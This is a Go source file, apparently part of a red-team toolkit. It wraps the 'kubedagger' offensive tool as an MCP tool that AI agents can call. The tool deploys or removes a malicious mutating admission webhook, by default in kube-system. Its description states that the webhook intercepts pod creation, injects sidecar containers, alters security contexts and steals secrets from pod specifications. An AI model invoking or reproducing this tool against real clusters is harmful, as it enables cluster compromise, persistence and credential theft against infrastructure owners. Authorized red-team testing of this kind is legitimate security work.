package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type WebhookInput struct {
	Action    string `json:"action,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Image     string `json:"image,omitempty"`
}

type WebhookTool struct {
	exec executor.Executor
}

func NewWebhook(exec executor.Executor) *WebhookTool {
	return &WebhookTool{exec: exec}
}

func (t *WebhookTool) Name() string { return "kubedagger_webhook" }

func (t *WebhookTool) Description() string {
	return "Deploy or remove a malicious mutating admission webhook that intercepts pod creation requests. Can inject sidecar containers, modify security contexts, or steal secrets from pod specifications."
}

func (t *WebhookTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["deploy", "remove"],
				"description": "Webhook action (default: deploy)"
			},
			"namespace": {
				"type": "string",
				"description": "Namespace to deploy the webhook service in (default: kube-system)"
			},
			"image": {
				"type": "string",
				"description": "Container image for the webhook server"
			}
		}
	}`)
}

func (t *WebhookTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input WebhookInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Image, "image"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"webhook"}
	if input.Action != "" {
		args = append(args, "--action", input.Action)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Image != "" {
		args = append(args, "--image", input.Image)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger webhook failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	action := input.Action
	if action == "" {
		action = "deploy"
	}
	fmt.Fprintf(&sb, "## KubeDagger Webhook: %s\n\n", action)
	if output == "" {
		sb.WriteString("Operation complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
